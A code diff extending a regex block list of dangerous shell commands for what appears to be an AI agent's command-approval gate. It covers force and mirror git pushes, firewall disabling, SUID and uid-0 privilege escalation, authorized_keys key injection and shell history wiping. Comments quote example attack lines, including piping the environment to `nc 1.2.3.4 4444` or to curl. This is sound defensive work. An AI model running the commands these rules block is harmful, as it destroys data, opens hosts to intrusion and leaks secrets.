@@ -212,6 +212,31 @@ def detect_hardline_command(command: str) -> tuple:
 
 
 # ---- Dangerous command patterns -----------------------------------------------------------
+# `git` accepts global options BEFORE the subcommand (`git -C DIR push`, `git -c k=v push --mirror`,
+# `git --git-dir=… push`). The old `\bgit\s+push\b` anchor let every global-option spelling bypass the
+# push rules — the incident's actual command was `git -C /srv/app push --mirror origin`.
+# The option group is bounded (fixed alternation, `-C` consumes exactly one argument) so it cannot
+# swallow an arbitrary word and revive cross-token FPs.
+_GIT_PUSH = (
+    r'\bgit\b(?:\s+(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)'
+    r'|--work-tree(?:=\S+|\s+\S+)|--namespace=\S+|--exec-path(?:=\S+|\s+\S+)))*\s+push\b'
+)
+# Same bounded global-option set as _GIT_PUSH, but placed AFTER `\bgit` so the regex-derived legacy
+# approval key (`p.split(r'\b')[1]`) stays UNIQUE per rule — `git…checkout`, `git…stash`, … — instead
+# of collapsing to the bare `git` key every push rule already shares (alias collision, see
+# _PATTERN_KEY_ALIASES). `-C`/`--git-dir`/`--work-tree`/`--exec-path` consume exactly one argument,
+# so the group cannot swallow an arbitrary word and revive cross-token false positives.
+_GIT_OPT = (
+    r'(?:\s+(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)'
+    r'|--work-tree(?:=\S+|\s+\S+)|--namespace=\S+|--exec-path(?:=\S+|\s+\S+)))*'
+)
+# Read-only spellings of a gated verb — the chain-wide criterion: no new or
+# touched rule may gate a pure lookup. The lookahead is anchored to the FIRST token after the
+# command word, so a flag further along the line buys no exemption (same shape as the
+# filter-repo rule). `--list` is included: swapoff/fuser take no `--list` ACTION, so it is only
+# ever an informational listing there, and a lookup is a lookup.
+_LOOKUP_FLAGS = r'(?!\s+(?:--help\b|-h\b|--version\b|--dry-run\b|--list\b))'
+
 DANGEROUS_PATTERNS = [
     (r'\brm\s+(-[^\s]*\s+)*/', "delete in root path"),
     (r'\brm\s+-[^\s]*r', "recursive delete"),
@@ -288,6 +313,30 @@ DANGEROUS_PATTERNS = [
     (rf'>\s*{_SYSTEM_CONFIG_PATH}', "overwrite system config"),
     (r'\bsystemctl\s+(-[^\s]+\s+)*(stop|restart|disable|mask)\b', "stop/restart system service"),
     (r'\bkill\s+-9\s+-1\b', "kill all processes"),
+    # `kill -9 1` (or any `kill -<sig> 1`) targets PID 1: killing init/systemd tears down every
+    # service on the host (X070). `kill -HUP $(cat pid)` (X075) has no bare `1` and stays clean.
+    (r'\bkill\s+-\w+\s+1\s*(?:;|&|$|\n)', "kill PID 1 (init)"),  # X070
+    # `ip link set <iface> down` takes a network interface offline — remote access included
+    # (X094). `ip -br a` (X099) and other read-only `ip` invocations don't carry `link … down`.
+    (r'\bip\b' + _SEGMENT_BOUND + r'\blink\b' + _SEGMENT_BOUND + r'\bset\b' + _SEGMENT_BOUND + r'\bdown\b',
+     "bring network interface down"),  # X094
+    # `systemctl isolate <target>` stops every unit not in the target; rescue/emergency targets
+    # drop all running services (X255). stop/restart/disable are gated by the rule above.
+    (r'\bsystemctl\s+(-[^\s]+\s+)*isolate\s+\S*(?:rescue|emergency)\S*',
+     "systemctl isolate/rescue (drops all running services)"),  # X255
+    # `swapoff -a` disables all swap — instant memory pressure/OOM on a busy host (X285).
+    # Lookup spellings stay clean per the chain-wide criterion (false-positive report):
+    # `swapoff --help/-h/--version/--dry-run/--list` only prints information (false-positive fix).
+    (r'\bswapoff\b' + _LOOKUP_FLAGS, "disable swap (swapoff)"),  # X285
+    # Writing to /proc/sysrq-trigger issues kernel emergency commands (crash, reboot, remount-ro)
+    # (X282). The target path is the signal; redirection/tee both land on it.
+    (r'\bsysrq-trigger\b', "write to sysrq-trigger (kernel emergency command)"),  # X282
+    # `ln -sf` over an /etc file replaces live system config (resolver, sudoers, sshd) with a
+    # symlink — silent service breakage or privilege redirection (X316). -s is required (a hard
+    # link to /etc files is already gated by overwrite rules when targeted); -f is what makes it
+    # silent replacement.
+    (rf'\bln\s+-[a-z]*f[a-z]*s[a-z]*\b|\bln\s+-[a-z]*s[a-z]*f[a-z]*\b' + _SEGMENT_BOUND + _SYSTEM_CONFIG_PATH,
+     "symlink over /etc file (ln -sf)"),  # X316
     (r'\bpkill\s+-9\b', "force kill processes"),
     # killall with SIGKILL (-9 / -KILL / -s KILL / -SIGKILL) and `killall -r <regex>` broad sweeps
     # that can wipe unrelated processes.
@@ -323,6 +372,14 @@ DANGEROUS_PATTERNS = [
     (r'\becho\b[^|]*\|\s*\btr\b[^|]*\|\s*\b(bash|sh|zsh|ksh|dash)\b', "pipe tr-transformed output to shell (possible command obfuscation)"),
     (r'\bopenssl\b.*\b(?:base64|enc)\b[^|]*\s+-[dD]\b[^|]*\|\s*\b(bash|sh|zsh|ksh|dash)\b',
      "pipe openssl-decoded content to shell (possible command obfuscation)"),
+    # SSH key implant (corpus X287): a write into an `authorized_keys` file adds a key that survives
+    # password rotation — the highest-value persistence primitive on a host. Must sit BEFORE the
+    # generic _SENSITIVE_WRITE_TARGET tee/redirection rules so this one file gets the honest reason;
+    # every other ~/.ssh/* write keeps "overwrite system file via redirection" (pinned by
+    # TestSensitiveRedirectPattern, which asserts only the verdict, and by the cp/mv/sed rules below,
+    # which carry no `>` or `tee` and so never reach this rule).
+    (r'>>?\s*[^;|&\n]*?\bauthorized_keys\b|\btee\b[^;|&\n]*?\bauthorized_keys\b',
+     "write to authorized_keys (SSH key injection)"),  # X287
     (rf'\btee\b.*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via tee"),
     (rf'>>?\s*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via redirection"),
     (rf'\btee\b.*["\']?{_PROJECT_SENSITIVE_WRITE_TARGET}["\']?{_WRITE_TARGET_BOUNDARY}', "overwrite project env/config via tee"),
@@ -368,6 +425,18 @@ DANGEROUS_PATTERNS = [
     (r'\bnohup\b.*gateway\s+run\b', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
     # Self-termination protection: prevent agent from killing its own process
     (r'\b(pkill|killall)\b.*\b(hermes|gateway|cli\.py)\b', "kill hermes/gateway process (self-termination)"),
+    # killall BY NAME is a broad sweep of every process matching the name (X061 `killall node`
+    # takes down the whole gateway fleet). Placed AFTER the SIGKILL/-r and self-termination rules
+    # so their specific descs win; the operand class excludes flags, so informational `killall -l`
+    # / `-V` (no process-name operand) stay clean.
+    (r'\bkillall\s+(?:-[^\s]*\s+)*[^\s-][^\s]*', "kill processes by name (killall)"),  # X061
+    # fuser -k kills every process holding the file/socket (X065 `fuser -k 8787/tcp`); plain
+    # `fuser <file>` only reports PIDs and stays clean — the rule requires the -k/--kill flag.
+    # GNU combined short options cluster, so `-km`/`-mk`/`-k9`/`-kmv` carry the SAME kill action
+    # as `-k -m` (same "clustered flag" class as the `-q` miss). The
+    # flag class is `[a-z]*k` — no other fuser single-letter flag contains `k` (list is
+    # -a -i -k -l -m -M -n -s -u -v -x), so a k inside a cluster can only be kill.
+    (r'\bfuser\b' + _SEGMENT_BOUND + r'\s(?:-[a-z]*k|--kill\b)', "kill processes on file/socket (fuser -k)"),  # X065
     # Self-termination via kill + $(pgrep/pidof): the substitution is opaque to the name-based
     # pattern above, so catch the structural form.
     (r'\bkill\b.*\$\(\s*(pgrep|pidof)\b', "kill process via pgrep/pidof expansion (self-termination)"),
@@ -418,8 +487,43 @@ DANGEROUS_PATTERNS = [
     # --ha, --har): --hard is the only reset mode starting with "h", and `--help` is special-cased
     # by git before mode resolution.
     (r'\bgit\s+reset\s+--h(?:a(?:r(?:d)?)?)?\b', "git reset --hard (destroys uncommitted changes)"),
-    (r'\bgit\s+push\b.*--forc[a-z]*\b', "git force push (rewrites remote history)"),
-    (r'\bgit\s+push\b.*-f\b', "git force push short flag (rewrites remote history)"),
+    # Mirror push deletes/force-updates EVERY remote ref absent locally (corpus X304, harm
+    # layer "history"). Bounded to one command segment (`[^;|&\n]`) so an unrelated later command's
+    # token can't contaminate, and anchored on the `--mirr` FLAG SPELLING (with git's unambiguous
+    # long-option abbreviations) so a remote/branch NAMED `mirror` (`git push origin mirror-sync`)
+    # stays clean. _GIT_GLOBAL_OPTS closes the `git -C <dir> push …` bypass (the incident
+    # ran exactly this form; the pre-existing force rules were bypassable the same way).
+    (_GIT_PUSH + r'[^;|&\n]*?\s--mirr[a-z]*\b', "git mirror push (deletes/overwrites remote refs not present locally)"),
+    # `git push --prune` DELETES remote branches absent locally — same harm class as corpus X305
+    # (`git push origin --delete`). Anchored on the push subcommand so the harmless
+    # `git fetch --all --prune` (X044, label 0) is untouched.
+    (_GIT_PUSH + r'[^;|&\n]*?\s--prune\b', "git push prune (deletes remote refs absent locally)"),
+    # corpus X305 (gate-vs-allow decided: GATE — label 1, harm layer
+    # "history": deleting an unmerged remote branch leaves commits only on the author's
+    # disk; same harm class as --prune above). Covers all three delete spellings:
+    # --delete / -d flag, and the colon-prefixed refspec (`git push origin :branch`,
+    # `:refs/heads/b`) which is delete-by-refspec. Bounded to the push command segment;
+    # a NON-prefixed colon refspec (`main:main`, `HEAD:main`) is a plain update and does
+    # not match (the `:` must sit right after whitespace).
+    (_GIT_PUSH + r'[^;|&\n]*?\s(?:-d\b|--delete\b|:\S+)', "git push delete (removes a remote branch/ref)"),
+    # corpus X040: a LEADING `+` in a refspec is force-push semantics
+    # (`git push origin +main:main` == `--force main:main`). The `+` must sit immediately
+    # after whitespace (refspec PREFIX position); git forbids `+`-prefixed ref/tag names,
+    # so name-internal `+` (`v2.0+build`), a trailing `+` (`main+`), and a `+` in a LATER
+    # command segment (`&& echo +done`) do not match.
+    (_GIT_PUSH + r'[^;|&\n]*?\s\+\S+', "git push force via +refspec prefix (rewrites remote history)"),
+    # --force-with-lease is the SAFE force variant (refuses stale overwrite; corpus X056 tier
+    # contextual). It stays gated — never silently allowed — but gets its own honest reason so the
+    # legacy "rewrites remote history" verdict no longer misattributes it. Must precede the
+    # --force rules: detection returns the FIRST pattern match and `--force\b` matches inside
+    # `--force-with-lease` (hyphen is a word boundary).
+    (_GIT_PUSH + r'[^;|&\n]*?--force-with-lease\b', "git push with lease (safe force variant, still overwrites when lease holds)"),
+    # `.*` (DOTALL) used to cross `;`/`&&`/`|`, blocking a harmless `git push --dry-run … | sed
+    # 's/[0-9a-f]\{40\}/…/'` on an unrelated `-f` in a LATER segment. Same-segment bound fixes it;
+    # real force pushes (`git push -f … && echo done`) still match because -f sits in the push
+    # segment itself.
+    (_GIT_PUSH + r'[^;|&\n]*?--forc[a-z]*\b', "git force push (rewrites remote history)"),
+    (_GIT_PUSH + r'[^;|&\n]*?-f\b', "git force push short flag (rewrites remote history)"),
     (r'\bgit\s+clean\s+-[^\s]*f', "git clean with force (deletes untracked files)"),
     (r'\bgit\s+branch\s+-D\b', "git branch force delete"),
     # `-D` = `-d --force`; the long spellings are different tokens, so match delete+force in either order, bounded to
@@ -521,6 +625,176 @@ DANGEROUS_PATTERNS = [
      "ssh-keygen overwrites default SSH identity key"),  # X227
     (r'\bvault\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*kv\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*delete\b',
      "delete Vault secret (vault kv delete)"),  # X212
+    # ── harm-layer "security" backlog (corpus, harm_layer=security) ────
+    # False negatives whose harm is a SECURITY-CONTROL loss: the host firewall or the brute-force
+    # guard disabled/punched open, credentials made group/world-readable, a privilege-escalation
+    # primitive planted (SUID bit, sudo group, uid-0 user, SSH key, plaintext credential store).
+    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
+    # segment cannot contaminate the verdict, and every rule was FP-measured against the corpus
+    # label-0 rows before landing (FP stays exactly the known 25 ids, no new id).
+    #
+    # ufw: `disable`/`reset` takes the host firewall down entirely (X087). The open-port rule is an
+    # explicit DATABASE/APP-service port list, never a wildcard, so the standard web ports stay
+    # clean: `ufw allow 443/tcp` (X098) and the source-restricted `ufw allow from 100.64.0.0/10 to
+    # any port 22 proto tcp` (X102) are label 0. `ufw delete allow 80/tcp` (X104) and `ufw reload`
+    # (X108) carry no matching verb/port pair.
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\b(?:disable|reset)\b',
+     "disable firewall (ufw disable/reset)"),  # X087
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\ballow\b' + _SEGMENT_BOUND + r'\b(?:5432|3306|6379|27017|9200|11211|5433|8080)\b',
+     "open database/app service port (ufw allow)"),  # X090 X103
+    # Residual: the two loosenings of the SAME family the port-list rule covers.
+    # `ufw default allow` flips the whole incoming/outgoing policy to permissive in one command —
+    # strictly broader than any single allow rule. The `from any` form needs `any` as the SOURCE
+    # (a word directly after `from`): X102's `ufw allow from 100.64.0.0/10 to any port 22` keeps
+    # `to any` as DESTINATION only and stays clean — the restricted-source boundary.
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\bdefault\b' + _SEGMENT_BOUND + r'\ballow\b',
+     "relax firewall default policy (ufw default allow)"),
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\ballow\b' + _SEGMENT_BOUND + r'\bfrom\s+any\b',
+     "open firewall to any source (ufw allow from any)"),
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\b(?:deny|reject|limit)\b' + _SEGMENT_BOUND + r'\b22\b',
+     "deny SSH access (ufw deny 22)"),  # X312
+    # iptables: -F flushes every rule, -P rewrites a chain policy (DROP/ACCEPT), -A/-I/-D add or
+    # remove a rule, and `-j DROP|REJECT` is the drop-everything payload. `iptables -L -n
+    # --line-numbers` (X101) is a read-only listing and stays clean.
+    (r'\biptables\b' + _SEGMENT_BOUND
+     + r'\s(?:-F\b|--flush\b|-P\b|--policy\b|-A\b|--append\b|-I\b|--insert\b|-D\b|--delete\b'
+     + r'|-j\s+(?:drop|reject)\b)',
+     "modify firewall rules (iptables)"),  # X088 X089 X093 X106 X311
+    (r'\bnft\b' + _SEGMENT_BOUND + r'\bflush\b' + _SEGMENT_BOUND + r'\bruleset\b',
+     "flush nftables ruleset"),  # X092
+    # Same loosening class as `iptables -P INPUT ACCEPT` (already gated by the
+    # iptables rule) in nftables spelling. An unconditional `accept` in the input chain bypasses
+    # every preceding rule for all matched traffic. `nft add rule … drop|reject` stays covered
+    # conceptually by rule-tightening harm, but is NOT gated here — only the ACCEPT direction of
+    # an explicitly-added rule is the loosening; `nft list ruleset` (read-only) stays clean.
+    (r'\bnft\b' + _SEGMENT_BOUND + r'\badd\s+(?:rule|table)\b' + _SEGMENT_BOUND + r'\baccept\b',
+     "accept-all nftables rule (nft add rule ... accept)"),
+    # `fail2ban-client stop` turns off brute-force protection for every jail; `set … unban` (X109)
+    # only clears one already-banned address and stays clean.
+    (r'\bfail2ban-client\b' + _SEGMENT_BOUND + r'\bstop\b',
+     "stop fail2ban (disables brute-force protection)"),  # X110
+    # chmod that OPENS a credential/env file to group or other: the mode's last two octal digits are
+    # both >= 4 (644/755/664 …), and the target must name an env/credential file. Tightening
+    # (600: X200, 700: X325), a non-sensitive target (README.md: X198, blog/: X204) and a symbolic
+    # mode (g+w: X205) all stay clean. Placed BEFORE the world-writable rules' own class so
+    # `chmod 777/666` keeps "world/other-writable permissions".
+    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s(?:[0-7]?[0-7])?[4-7][4-7]\s+(?:-[^\s]+\s+)*\S*'
+     r'(?:\.env(?:\.[\w.-]+)*|credentials?|\.netrc|\.pgpass|\.npmrc|\.pypirc|id_rsa|id_ed25519|\.pem|\.key)\b',
+     "grant group/other read access to env/credential file"),  # X207 X220
+    # SUID/SGID bit: a setuid binary runs as its owner regardless of who invokes it — the classic
+    # local privilege-escalation primitive. Octal 4xxx/2xxx/6xxx or the symbolic `+s`.
+    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s(?:[ugoa]*\+s\b|[246][0-7]{3}\b)',
+     "set SUID bit on executable"),  # X190 X195
+    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s0{3,4}\b',
+     "remove all permissions (chmod 000)"),  # X196
+    # Recursive chown of /root (or its .ssh) hands the whole home — private keys, .env, config — to
+    # another user. A subtree (`/root/builds`: X201, `/root/blog`: X208) is NOT the home
+    # itself and stays clean, so the target needs an explicit end-of-token boundary. `/root/.ssh` is
+    # folded to `~/.ssh` by _fold_resolved_ssh_dir before matching (HOME=/root), so both spellings
+    # are listed — the general home fold never fires for a single-component home, which is why a
+    # bare `/root` still arrives unfolded.
+    (r'\bchown\b' + _SEGMENT_BOUND + r'\s(?:-[a-z]*R[a-z]*\b|--recursive\b)' + _SEGMENT_BOUND
+     + r'\s(?:/root(?:/\.ssh)?(?:/\*)?|~/\.ssh(?:/\*)?|~)(?=[\s;|&]|$)',
+     "recursive chown of /root or /root/.ssh"),  # X189 X315
+    # usermod: adding a user to a privileged group (sudo/wheel/adm/docker — docker group is
+    # root-equivalent via the daemon socket) or locking an account.
+    (r'\busermod\b' + _SEGMENT_BOUND + r'\s-a[a-z]*G?[a-z]*\b' + _SEGMENT_BOUND + r'\b(?:sudo|wheel|adm|docker)\b',
+     "grant privileged group membership (usermod -aG sudo)"),  # X191
+    (r'\busermod\b' + _SEGMENT_BOUND + r'\s(?:-L\b|--lock\b)',
+     "lock user account (usermod -L)"),  # X301
+    # `passwd -d` removes the password hash entirely, so the account authenticates with an empty
+    # password — a silent remote-login door.
+    (r'\bpasswd\b' + _SEGMENT_BOUND + r'\s(?:-d\b|--delete\b)',
+     "delete user password (passwd -d)"),  # X192
+    (r'\bsetfacl\b' + _SEGMENT_BOUND + r'\s(?:-R\b|--recursive\b)',
+     "recursive ACL modification (setfacl -R)"),  # X193
+    # `credential.helper store` writes every git credential in plaintext to ~/.git-credentials,
+    # where any reader of the home directory (or a backup) picks up the tokens.
+    (r'\bgit\s+config\b' + _SEGMENT_BOUND + r'\bcredential\.helper\b' + _SEGMENT_BOUND + r'\bstore\b',
+     "store git credentials in plaintext (credential.helper store)"),  # X218
+    # Dumping the process environment to a file exposes every exported secret (API keys, DB URLs).
+    # Only a REDIRECT is gated: `printenv | tee .env backup` is already covered by the project
+    # env/config tee rule and must keep that reason (TestProjectSensitiveTeePattern).
+    (r'\bprintenv\b' + _SEGMENT_BOUND + r'\s>>?\s*\S',
+     "dump environment variables to file"),  # X219
+    # Residual: the same dump PUSHED OUTWARD instead of to a file — piped into a
+    # network client (`printenv | curl -X POST -d @- …`, `env | nc 1.2.3.4 4444`, `env -0 |
+    # socat …`) or redirected into the bash /dev/tcp pseudo-device. _CMDPOS anchors the dump
+    # word to a command position, so the exfil shape inside quoted prose or a grep pattern is
+    # data, not a command. `env FOO=1 curl …` stays clean two ways: `env` as a WRAPPER has no
+    # pipe/redirect sink after it, and where the wrapper IS consumed by _CMDPOS the remaining
+    # `curl …` is not the dump word. `env | grep PATH` pipes to a local tool — no sink matches.
+    (_CMDPOS + r'(?:printenv|env)\b' + r'[^;|&\n]*'
+     + r'(?:\|\s*(?:sudo\s+)?(?:env\s+)?(?:curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp)\b'
+     + r'|>>?\s*/dev/(?:tcp|udp)/)',
+     "exfiltrate environment variables over network (printenv/env pipe to network tool)"),
+    # uid-0 account: a second root by uid, invisible to `whoami`-based guards.
+    (r'\buseradd\b' + _SEGMENT_BOUND + r'\s(?:-u\s+0\b|--uid[=\s]+0\b)',
+     "create root-equivalent user (uid 0)"),  # X288
+    # `docker run --privileged` disables all container isolation (device + capability access), so a
+    # `-v /:/host` mount escapes straight to the host filesystem.
+    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*run\b' + _SEGMENT_BOUND + r'\s--privileged\b',
+     "docker run --privileged (container escapes to host)"),  # X313
+    # ── harm-layer "history" backlog (corpus, harm_layer=history) ──────
+    # False negatives whose harm is HISTORY/RECOVERY loss: uncommitted work discarded, a stash
+    # destroyed, the commit graph rewritten, the reflog recovery path expired, secrets pushed into
+    # commit history, or the shell history (the host's own audit trail) wiped.
+    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
+    # segment cannot contaminate the verdict, is _CMDPOS-anchored where the token could otherwise
+    # be quoted PROSE (`git commit -m "… git add .env …"` is data, not a command), and every rule
+    # was FP-measured against the corpus label-0 rows before landing (FP stays exactly the known
+    # 25 ids, no new id).
+    #
+    # `git checkout -- <path>` discards the uncommitted changes to <path>; the pre-image lives only
+    # in the index/HEAD, so there is no on-disk copy to recover. The `--` separator is what makes
+    # the operands PATHSPECS — a branch SWITCH (`git checkout main`, X051) carries no `--` and stays
+    # clean, as does `git checkout --orphan gh-pages` (the token after `--` is not a separator).
+    # The bare `git checkout .` spelling is the SAME discard-all without the separator and is
+    # accepted by the identical alternative; `git checkout ./file` is a PATH and does not match.
+    # `git restore --staged .` (X057) only unstages and is likewise clean.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+checkout\b' + _SEGMENT_BOUND + r'\s(?:--|\.)(?:\s|$)',
+     "git checkout -- (discards uncommitted changes)"),  # X033
+    # A stash is a one-copy safety net: `drop` deletes one entry, `clear` deletes every entry.
+    # `git stash push -m …` (X050) and `git stash pop` (X054) keep the entry and stay clean.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+stash\b' + _SEGMENT_BOUND + r'\s(?:drop|clear)\b',
+     "git stash drop/clear (destroys stashed changes)"),  # X038 X303
+    # `filter-repo`/`filter-branch` rewrite every commit hash in the repository: the original objects
+    # become unreachable and every clone/PR based on them is invalidated. Read-only spellings stay
+    # clean per the chain-wide rule ("no new rule may gate a lookup"): `--help`/`-h` print the man
+    # page, `--version` prints the banner, and `--dry-run` only REPORTS what would be rewritten
+    # (filter-repo never touches the object store under it). The lookahead is anchored to the token
+    # directly after the command word, so a flag further along the line does not buy an exemption,
+    # and a real rewrite (`--force`, `--tree-filter`, `--path`) is still gated.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+(?:filter-repo|filter-branch)\b'
+     + r'(?!\s+(?:--help\b|-h\b|--version\b|--dry-run\b))',
+     "git history rewrite (filter-repo/filter-branch)"),  # X035
+    # `reflog expire` drops the reflog entries that make a bad reset/rebase recoverable — the usual
+    # first half of "wipe the local evidence" (`&& git gc --prune=now` finishes the job).
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+reflog\b' + _SEGMENT_BOUND + r'\s+expire\b',
+     "git reflog expire (destroys recovery path)"),  # X302
+    # Committing an env file publishes every secret it holds into the repository history, where a
+    # later `git rm` cannot take it back (the blob stays in the pack and in every clone). Only the
+    # env-file family is gated. EXACT template suffixes — `.env.example`, `.env.sample`,
+    # `.env.template` (and prefixed variants like `.env.local.example`) — are exempted per the
+    # Review verdict: the industry standard is to commit templates (they hold no real
+    # values, only placeholders). Anything else in the family keeps the gate when in doubt
+    # (`.env`, `.env.local`, `.env.production`, `.env.*.local`, `.env.examples`).
+    # `--dry-run`/`-n` only REPORTS what would be staged — a lookup under the chain-wide criterion, so
+    # the flag anywhere BEFORE the env path suppresses the gate (tempered group: the scan from
+    # `add` to the path cannot cross a dry-run token). A path that precedes the flag
+    # (`git add .env --dry-run`) still gates — flag-last spellings are rare and gating the
+    # doubtful case is the safe direction. `git add -A` (X045) carries no env path either way.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+add\b'
+     + r'(?:(?!--dry-run\b)(?!-n(?=[\s;|&)]))[^;|&\n])*'
+     + r'\s\S*'
+     + r'(?:(?:/|\.{1,2}/)?(?:[^\s/"\'`]+/)*\.env'
+     + r'(?!\.(?:[\w-]+\.)*(?:example|sample|template)\b)'
+     + r'(?:\.[^/\s"\'`]+)*)',
+     "git add of env file (secrets into commit history)"),  # X229
+    # `history -c` wipes the shell's command log — the only local record of what ran on the host,
+    # which is what an intruder clears first. _CMDPOS-anchored so `history` must be the command word
+    # (`grep history -c README`, `git log --oneline history -c` are data).
+    (_CMDPOS + r'history\b' + r'\s+-c\b', "clear shell history (history -c)"),  # X291
 ]
 
 
